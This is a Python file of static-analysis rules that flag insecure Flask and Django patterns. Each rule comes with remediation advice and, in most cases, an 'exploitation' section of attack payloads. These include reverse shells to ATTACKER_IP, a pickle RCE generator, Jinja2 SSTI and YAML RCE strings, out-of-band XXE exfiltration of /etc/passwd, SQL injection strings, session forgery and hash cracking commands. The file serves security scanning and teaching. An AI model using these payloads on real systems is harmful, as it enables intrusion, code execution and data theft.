"""
Python security rules for static analysis (Flask, Django).
"""

from dataclasses import dataclass
from enum import Enum
from typing import List

# Import shared types from rules.py
from rules import SecurityRule, Severity


PYTHON_SECURITY_RULES: List[SecurityRule] = [
    # -------------------------------------------------------------------------
    # COMMAND INJECTION
    # -------------------------------------------------------------------------
    SecurityRule(
        id="PY-CMD-001",
        name="OS Command Injection",
        pattern=r"\b(os\.system|os\.popen|subprocess\.call|subprocess\.run|subprocess\.Popen)\s*\([^)]*(\+|%|\.format|f['\"])",
        severity=Severity.CRITICAL,
        category="Command Injection",
        cwe_id="CWE-78",
        description="Command execution with string concatenation/formatting - likely command injection.",
        exploitation="""
╔══════════════════════════════════════════════════════════════════════════════╗
║  PYTHON COMMAND INJECTION                                                    ║
╚══════════════════════════════════════════════════════════════════════════════╝

VULNERABLE CODE:
os.system("ping " + user_input)
subprocess.call(f"nmap {target}", shell=True)

PAYLOADS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

; id
| id
`id`
$(id)
; nc -e /bin/sh ATTACKER_IP 4444
; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
; python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

TESTING:
curl "http://target.com/ping?host=127.0.0.1;id"
curl "http://target.com/ping?host=127.0.0.1|sleep+5" """,
        remediation="Use subprocess with shell=False and pass args as list: subprocess.run(['ping', '-c', '1', host])"
    ),
    SecurityRule(
        id="PY-CMD-002",
        name="Shell=True in Subprocess",
        pattern=r"subprocess\.(call|run|Popen)\s*\([^)]*shell\s*=\s*True",
        severity=Severity.HIGH,
        category="Command Injection",
        cwe_id="CWE-78",
        description="subprocess with shell=True is vulnerable to command injection if input is not sanitized.",
        exploitation="""
SHELL=TRUE VULNERABILITY:
When shell=True, the command is passed to the shell, enabling injection.

Even with shlex.quote(), some bypasses exist. Prefer shell=False with list args.""",
        remediation="Use shell=False and pass command as list of arguments."
    ),
    SecurityRule(
        id="PY-CMD-003",
        name="Eval/Exec with User Input",
        pattern=r"\b(eval|exec)\s*\(\s*[^)]*(\brequest\b|input\s*\(|sys\.argv|os\.environ)",
        severity=Severity.CRITICAL,
        category="Code Injection",
        cwe_id="CWE-94",
        description="eval/exec with user-controllable input allows arbitrary code execution.",
        exploitation="""
╔══════════════════════════════════════════════════════════════════════════════╗
║  PYTHON CODE INJECTION VIA EVAL/EXEC                                         ║
╚══════════════════════════════════════════════════════════════════════════════╝

PAYLOADS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

__import__('os').system('id')
__import__('os').popen('id').read()
__import__('subprocess').check_output(['id'])

# Reverse shell
__import__('os').system('bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1')

# If quotes are filtered
__import__(chr(111)+chr(115)).system(chr(105)+chr(100))

# Read files
open('/etc/passwd').read()
__import__('builtins').open('/etc/passwd').read()""",
        remediation="Never use eval/exec with user input. Use ast.literal_eval for safe evaluation of literals."
    ),

    # -------------------------------------------------------------------------
    # SQL INJECTION
    # -------------------------------------------------------------------------
    SecurityRule(
        id="PY-SQL-001",
        name="SQL Injection (String Formatting)",
        pattern=r"(execute|executemany|raw|cursor\.)\s*\(\s*[^)]*(%s|%d|\{|\.format|\+)[^)]*\)",
        severity=Severity.CRITICAL,
        category="SQL Injection",
        cwe_id="CWE-89",
        description="SQL query with string formatting - SQL injection vulnerability.",
        exploitation="""
╔══════════════════════════════════════════════════════════════════════════════╗
║  PYTHON SQL INJECTION                                                        ║
╚══════════════════════════════════════════════════════════════════════════════╝

VULNERABLE CODE:
cursor.execute("SELECT * FROM users WHERE id = " + user_id)
cursor.execute(f"SELECT * FROM users WHERE name = '{name}'")

PAYLOADS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

' OR '1'='1
' OR '1'='1' --
' UNION SELECT username,password FROM users --
' UNION SELECT null,null,null --
1; DROP TABLE users; --

# Blind SQLi
' AND SLEEP(5) --
' AND (SELECT SLEEP(5) FROM users WHERE username='admin') --

# SQLite specific
' UNION SELECT sql FROM sqlite_master --
' UNION SELECT name FROM sqlite_master WHERE type='table' --""",
        remediation="Use parameterized queries: cursor.execute('SELECT * FROM users WHERE id = ?', (user_id,))"
    ),
    SecurityRule(
        id="PY-SQL-002",
        name="Django Raw SQL",
        pattern=r"\.raw\s*\(\s*[^)]*(%|\.format|f['\"]|\+)",
        severity=Severity.CRITICAL,
        category="SQL Injection",
        cwe_id="CWE-89",
        description="Django raw() with string formatting - SQL injection.",
        exploitation="Same as PY-SQL-001. Use params argument: Model.objects.raw(sql, params)",
        remediation="Use params: Model.objects.raw('SELECT * FROM app_model WHERE id = %s', [user_id])"
    ),
    SecurityRule(
        id="PY-SQL-003",
        name="SQLAlchemy Text with Formatting",
        pattern=r"(text|execute)\s*\(\s*[^)]*(%|\.format|f['\"]|\+)",
        severity=Severity.HIGH,
        category="SQL Injection",
        cwe_id="CWE-89",
        description="SQLAlchemy query with string formatting - potential SQL injection.",
        exploitation="Use bound parameters: text('SELECT * FROM users WHERE id = :id').bindparams(id=user_id)",
        remediation="Use SQLAlchemy's bindparams() or parameterized queries."
    ),

    # -------------------------------------------------------------------------
    # PATH TRAVERSAL / LFI
    # -------------------------------------------------------------------------
    SecurityRule(
        id="PY-PATH-001",
        name="Path Traversal in File Operations",
        pattern=r"(open|send_file|send_from_directory|safe_join)\s*\([^)]*(\brequest\b|user|input|param|arg)",
        severity=Severity.HIGH,
        category="Path Traversal",
        cwe_id="CWE-22",
        description="File operation with potentially user-controlled path.",
        exploitation="""
╔══════════════════════════════════════════════════════════════════════════════╗
║  PYTHON PATH TRAVERSAL                                                       ║
╚══════════════════════════════════════════════════════════════════════════════╝

PAYLOADS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc/passwd
..%252f..%252f..%252fetc/passwd (double encoding)

# Flask specific - test send_file
/download?file=../../../etc/passwd
/static/../../../etc/passwd

# Windows
..\\..\\..\\windows\\system32\\config\\sam
..%5c..%5c..%5cwindows%5csystem32%5cconfig%5csam""",
        remediation="Use os.path.realpath() and verify path starts with allowed directory. Use werkzeug.utils.secure_filename()."
    ),
    SecurityRule(
        id="PY-PATH-002",
        name="Unsafe File Path Join",
        pattern=r"os\.path\.join\s*\([^)]*(\brequest\b|user|input|param|arg)",
        severity=Severity.MEDIUM,
        category="Path Traversal",
        cwe_id="CWE-22",
        description="os.path.join with user input - absolute paths bypass the base directory.",
        exploitation="""
OS.PATH.JOIN BYPASS:
os.path.join('/safe/dir', '/etc/passwd') = '/etc/passwd'

If user input starts with '/', it becomes the entire path!

PAYLOADS:
/etc/passwd
/proc/self/environ
/var/log/apache2/access.log (log poisoning)""",
        remediation="Check that result starts with base dir: assert resolved.startswith(base_dir)"
    ),

    # -------------------------------------------------------------------------
    # FLASK SPECIFIC
    # -------------------------------------------------------------------------
    SecurityRule(
        id="PY-FLASK-001",
        name="Flask Debug Mode",
        pattern=r"app\.run\s*\([^)]*debug\s*=\s*True|DEBUG\s*=\s*True",
        severity=Severity.CRITICAL,
        category="Information Disclosure",
        cwe_id="CWE-489",
        description="Flask debug mode enabled - exposes Werkzeug debugger with RCE capability.",
        exploitation="""
╔══════════════════════════════════════════════════════════════════════════════╗
║  FLASK DEBUG MODE RCE (WERKZEUG DEBUGGER)                                    ║
╚══════════════════════════════════════════════════════════════════════════════╝

VULNERABILITY:
Flask debug mode enables Werkzeug debugger which allows code execution!

EXPLOITATION:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. Cause an error (e.g., visit non-existent route or trigger exception)
2. Click on any line in the stack trace
3. Click the terminal icon to get interactive Python console
4. Execute: import os; os.system('id')

IF PIN PROTECTED:
The PIN can be calculated if you know:
- Machine ID: /etc/machine-id or /proc/sys/kernel/random/boot_id
- MAC address: /sys/class/net/eth0/address
- Username running the app: /proc/self/environ (check USER)
- Flask app path: visible in error page

Tool: https://github.com/wdahlenburg/werkzeug-debug-console-bypass

TESTING:
curl http://target.com/nonexistent -v
# Look for Werkzeug Debugger in response""",
        remediation="Never use debug=True in production. Set FLASK_ENV=production."
    ),
    SecurityRule(
        id="PY-FLASK-002",
        name="Flask SSTI",
        pattern=r"(render_template_string|Template)\s*\([^)]*(\brequest\b|user|input|\+|\.format|f['\"])",
        severity=Severity.CRITICAL,
        category="Template Injection",
        cwe_id="CWE-94",
        description="Jinja2 template with user input - Server-Side Template Injection.",
        exploitation="""
╔══════════════════════════════════════════════════════════════════════════════╗
║  FLASK/JINJA2 SSTI                                                           ║
╚══════════════════════════════════════════════════════════════════════════════╝

DETECTION:
{{7*7}} → 49
{{7*'7'}} → 7777777

RCE PAYLOADS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Basic RCE
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Via request
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Via cycler (works on many versions)
{{cycler.__init__.__globals__.os.popen('id').read()}}

# Via lipsum
{{lipsum.__globals__['os'].popen('id').read()}}

# Get config
{{config.items()}}
{{config.SECRET_KEY}}

# File read
{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}

BYPASS FILTERS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# If _ is blocked
{{request|attr('application')}}

# If . is blocked  
{{request['application']}}

# Hex encoding
{{request|attr('\\x5f\\x5fclass\\x5f\\x5f')}}""",
        remediation="Never use render_template_string with user input. Use render_template with separate .html files."
    ),
    SecurityRule(
        id="PY-FLASK-003",
        name="Flask Secret Key Hardcoded",
        pattern=r"(SECRET_KEY|secret_key)\s*=\s*['\"][^'\"]{1,50}['\"]",
        severity=Severity.HIGH,
        category="Hardcoded Secrets",
        cwe_id="CWE-798",
        description="Hardcoded Flask secret key - session forgery possible.",
        exploitation="""
FLASK SESSION FORGERY:
With the secret key, you can forge session cookies!

1. Decode existing session:
   flask-unsign --decode --cookie 'eyJ...'

2. Forge new session:
   flask-unsign --sign --cookie "{'user': 'admin', 'is_admin': True}" --secret 'FOUND_SECRET'

3. Or brute force the secret:
   flask-unsign --unsign --cookie 'eyJ...' --wordlist /usr/share/wordlists/rockyou.txt

TOOL: pip install flask-unsign""",
        remediation="Use environment variable: app.secret_key = os.environ.get('SECRET_KEY')"
    ),

    # -------------------------------------------------------------------------
    # DJANGO SPECIFIC
    # -------------------------------------------------------------------------
    SecurityRule(
        id="PY-DJANGO-001",
        name="Django Debug Mode",
        pattern=r"DEBUG\s*=\s*True",
        severity=Severity.HIGH,
        category="Information Disclosure",
        cwe_id="CWE-489",
        description="Django DEBUG=True exposes sensitive information in error pages.",
        exploitation="""
DJANGO DEBUG MODE:
Exposes:
- Full stack traces with source code
- SQL queries
- Settings (may include secrets)
- Template paths

Testing: Cause a 404 or trigger an error to see debug page.""",
        remediation="Set DEBUG=False in production. Use django-debug-toolbar only in development."
    ),
    SecurityRule(
        id="PY-DJANGO-002",
        name="Django CSRF Exempt",
        pattern=r"@csrf_exempt|csrf_exempt",
        severity=Severity.MEDIUM,
        category="CSRF",
        cwe_id="CWE-352",
        description="CSRF protection disabled - vulnerable to cross-site request forgery.",
        exploitation="""
CSRF ATTACK:
Create malicious page that submits form to vulnerable endpoint:

<form action="http://target.com/transfer" method="POST" id="csrf">
  <input name="to" value="attacker">
  <input name="amount" value="10000">
</form>
<script>document.getElementById('csrf').submit();</script>""",
        remediation="Remove @csrf_exempt. If API endpoint, use token-based auth instead."
    ),
    SecurityRule(
        id="PY-DJANGO-003",
        name="Django Secret Key Exposed",
        pattern=r"SECRET_KEY\s*=\s*['\"][^'\"]+['\"]",
        severity=Severity.HIGH,
        category="Hardcoded Secrets",
        cwe_id="CWE-798",
        description="Django SECRET_KEY hardcoded - session forgery and crypto weaknesses.",
        exploitation="Similar to Flask - used for signing cookies, CSRF tokens, password reset tokens.",
        remediation="Use environment variable: SECRET_KEY = os.environ.get('DJANGO_SECRET_KEY')"
    ),
    SecurityRule(
        id="PY-DJANGO-004",
        name="Django Unsafe Redirect",
        pattern=r"(HttpResponseRedirect|redirect)\s*\([^)]*(\brequest\.GET|request\.POST|request\.REQUEST)",
        severity=Severity.MEDIUM,
        category="Open Redirect",
        cwe_id="CWE-601",
        description="Redirect using user input - open redirect vulnerability.",
        exploitation="""
OPEN REDIRECT:
?next=https://evil.com
?next=//evil.com
?next=/\\evil.com
?next=https:evil.com

Use for phishing or to bypass redirect restrictions in OAuth flows.""",
        remediation="Validate redirect URL is relative or matches allowed domains."
    ),

    # -------------------------------------------------------------------------
    # DESERIALIZATION
    # -------------------------------------------------------------------------
    SecurityRule(
        id="PY-DESER-001",
        name="Pickle Deserialization",
        pattern=r"pickle\.(loads?|Unpickler)\s*\(",
        severity=Severity.CRITICAL,
        category="Insecure Deserialization",
        cwe_id="CWE-502",
        description="Pickle deserialization - arbitrary code execution if data is untrusted.",
        exploitation="""
╔══════════════════════════════════════════════════════════════════════════════╗
║  PYTHON PICKLE RCE                                                           ║
╚══════════════════════════════════════════════════════════════════════════════╝

GENERATE PAYLOAD:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('id',))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)

# For reverse shell:
class RCE:
    def __reduce__(self):
        return (os.system, ('bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1',))

COMMON LOCATIONS:
- Session cookies (Flask uses pickle by default!)
- Cache backends (memcached, redis)
- Celery task arguments
- WebSocket messages""",
        remediation="Never unpickle untrusted data. Use JSON for serialization. Use itsdangerous for signed data."
    ),
    SecurityRule(
        id="PY-DESER-002",
        name="YAML Unsafe Load",
        pattern=r"yaml\.(load|unsafe_load)\s*\([^)]*Loader\s*=\s*(yaml\.)?Loader|yaml\.load\s*\([^)]*\)\s*$",
        severity=Severity.CRITICAL,
        category="Insecure Deserialization",
        cwe_id="CWE-502",
        description="YAML load without SafeLoader allows arbitrary code execution.",
        exploitation="""
YAML DESERIALIZATION RCE:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

!!python/object/apply:os.system ['id']

!!python/object/new:subprocess.check_output [['id']]

!!python/object/apply:subprocess.Popen
- ['bash', '-c', 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1']""",
        remediation="Use yaml.safe_load() or yaml.load(data, Loader=yaml.SafeLoader)"
    ),

    # -------------------------------------------------------------------------
    # SSRF
    # -------------------------------------------------------------------------
    SecurityRule(
        id="PY-SSRF-001",
        name="SSRF via Requests",
        pattern=r"requests\.(get|post|put|delete|head|patch)\s*\([^)]*(\brequest\b|user|input|param|url)",
        severity=Severity.HIGH,
        category="Server-Side Request Forgery",
        cwe_id="CWE-918",
        description="HTTP request with user-controlled URL - SSRF vulnerability.",
        exploitation="""
╔══════════════════════════════════════════════════════════════════════════════╗
║  PYTHON SSRF                                                                 ║
╚══════════════════════════════════════════════════════════════════════════════╝

PAYLOADS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Internal services
http://127.0.0.1:80
http://localhost:8080
http://[::1]:80

# Cloud metadata
http://169.254.169.254/latest/meta-data/  (AWS)
http://169.254.169.254/metadata/v1/       (DigitalOcean)
http://metadata.google.internal/          (GCP)

# Internal network scan
http://192.168.1.1
http://10.0.0.1
http://172.16.0.1

# Protocol smuggling
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall  (Redis)
file:///etc/passwd

# DNS rebinding
Use rebinder.io to point to internal IP""",
        remediation="Whitelist allowed URLs/domains. Block private IP ranges. Disable redirects."
    ),
    SecurityRule(
        id="PY-SSRF-002",
        name="SSRF via urllib",
        pattern=r"urllib\.(request\.)?(urlopen|Request)\s*\([^)]*(\brequest\b|user|input|param)",
        severity=Severity.HIGH,
        category="Server-Side Request Forgery",
        cwe_id="CWE-918",
        description="urllib with user-controlled URL - SSRF vulnerability.",
        exploitation="See PY-SSRF-001 for payloads.",
        remediation="Validate and whitelist URLs before making requests."
    ),

    # -------------------------------------------------------------------------
    # XXE
    # -------------------------------------------------------------------------
    SecurityRule(
        id="PY-XXE-001",
        name="XML External Entity Injection",
        pattern=r"(etree\.parse|etree\.fromstring|xml\.dom\.minidom|xml\.sax|XMLParser)\s*\(",
        severity=Severity.HIGH,
        category="XXE",
        cwe_id="CWE-611",
        description="XML parsing may be vulnerable to XXE if external entities are not disabled.",
        exploitation="""
╔══════════════════════════════════════════════════════════════════════════════╗
║  PYTHON XXE                                                                  ║
╚══════════════════════════════════════════════════════════════════════════════╝

PAYLOADS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

# SSRF via XXE
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">

# Blind XXE (out-of-band)
<!ENTITY % xxe SYSTEM "http://ATTACKER_IP/evil.dtd">
%xxe;

# In evil.dtd:
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER_IP/?x=%file;'>">
%eval;
%exfil;""",
        remediation="Use defusedxml library. Or: parser = etree.XMLParser(resolve_entities=False)"
    ),

    # -------------------------------------------------------------------------
    # AUTHENTICATION
    # -------------------------------------------------------------------------
    SecurityRule(
        id="PY-AUTH-001",
        name="Weak Password Hashing",
        pattern=r"(md5|sha1|sha256)\s*\([^)]*password",
        severity=Severity.HIGH,
        category="Weak Cryptography",
        cwe_id="CWE-328",
        description="Passwords hashed with weak algorithm - vulnerable to rainbow tables.",
        exploitation="""
WEAK HASHING:
MD5/SHA1/SHA256 without salt are vulnerable to:
- Rainbow table attacks
- GPU cracking (hashcat)

Hashcat modes:
md5: -m 0
sha1: -m 100
sha256: -m 1400

hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt""",
        remediation="Use bcrypt, argon2, or scrypt: from werkzeug.security import generate_password_hash"
    ),
    SecurityRule(
        id="PY-AUTH-002",
        name="Hardcoded Password/Credentials",
        pattern=r"(password|passwd|pwd|secret|api_key|apikey|token|auth)\s*=\s*['\"][^'\"]{4,}['\"]",
        severity=Severity.HIGH,
        category="Hardcoded Secrets",
        cwe_id="CWE-798",
        description="Potential hardcoded credentials in source code.",
        exploitation="Extract credentials and test on login forms, APIs, SSH, etc.",
        remediation="Use environment variables or secure secret management."
    ),
    SecurityRule(
        id="PY-AUTH-003",
        name="JWT None Algorithm",
        pattern=r"(jwt\.decode|decode)\s*\([^)]*verify\s*=\s*False|algorithms\s*=\s*\[\s*['\"]none['\"]",
        severity=Severity.CRITICAL,
        category="Authentication Bypass",
        cwe_id="CWE-347",
        description="JWT verification disabled or 'none' algorithm allowed.",
        exploitation="""
JWT NONE ALGORITHM ATTACK:
1. Decode the JWT (base64)
2. Change header alg to "none"
3. Modify payload (e.g., "admin": true)
4. Remove signature

Original: eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiam9obiJ9.signature
Attack: eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.

Tool: jwt_tool, python-jwt""",
        remediation="Always verify JWTs. Specify allowed algorithms explicitly."
    ),

    # -------------------------------------------------------------------------
    # MISC VULNERABILITIES
    # -------------------------------------------------------------------------
    SecurityRule(
        id="PY-MISC-001",
        name="Unsafe Redirect",
        pattern=r"(redirect|Response\.headers\['Location'\])\s*[=\(][^)]*(\brequest\b|user|input)",
        severity=Severity.MEDIUM,
        category="Open Redirect",
        cwe_id="CWE-601",
        description="Redirect with user input - open redirect vulnerability.",
        exploitation="""
OPEN REDIRECT PAYLOADS:
?url=https://evil.com
?url=//evil.com
?url=/\\evil.com
?url=https://target.com@evil.com
?url=https://evil.com#https://target.com""",
        remediation="Validate redirect URL against whitelist of allowed destinations."
    ),
    SecurityRule(
        id="PY-MISC-002",
        name="Insecure Random",
        pattern=r"\brandom\.(random|randint|choice|shuffle)\s*\(",
        severity=Severity.MEDIUM,
        category="Weak Cryptography",
        cwe_id="CWE-330",
        description="Using random module for security-sensitive operations is predictable.",
        exploitation="If used for tokens/passwords, the PRNG can be predicted if seed is known or guessed.",
        remediation="Use secrets module: secrets.token_urlsafe(), secrets.randbelow()"
    ),
    SecurityRule(
        id="PY-MISC-003",
        name="Assert Statement in Production",
        pattern=r"^\s*assert\s+",
        severity=Severity.LOW,
        category="Security Misconfiguration",
        cwe_id="CWE-617",
        description="Assert statements are removed when Python runs with -O flag.",
        exploitation="If asserts are used for security checks, they can be bypassed with python -O",
        remediation="Use proper if statements with exceptions for security checks."
    ),
    SecurityRule(
        id="PY-MISC-004",
        name="XML-RPC Enabled",
        pattern=r"(SimpleXMLRPCServer|xmlrpc\.server)",
        severity=Severity.MEDIUM,
        category="Remote Code Execution",
        cwe_id="CWE-94",
        description="XML-RPC server may expose internal methods.",
        exploitation="Enumerate available methods: system.listMethods(), then call them.",
        remediation="Restrict exposed methods. Use authentication. Consider alternatives to XML-RPC."
    ),
    SecurityRule(
        id="PY-MISC-005",
        name="Subprocess with Untrusted Input",
        pattern=r"subprocess\.[a-zA-Z]+\s*\(\s*\[?[^\]]*(\brequest\b|user|input|sys\.argv)",
        severity=Severity.HIGH,
        category="Command Injection",
        cwe_id="CWE-78",
        description="Subprocess call with potentially untrusted input.",
        exploitation="Even without shell=True, improper argument handling can be dangerous.",
        remediation="Validate and sanitize all input. Use allowlists for commands."
    ),
]


PYTHON_TOTAL_RULES = len(PYTHON_SECURITY_RULES)
PYTHON_RULE_CATEGORIES = list(set(rule.category for rule in PYTHON_SECURITY_RULES))
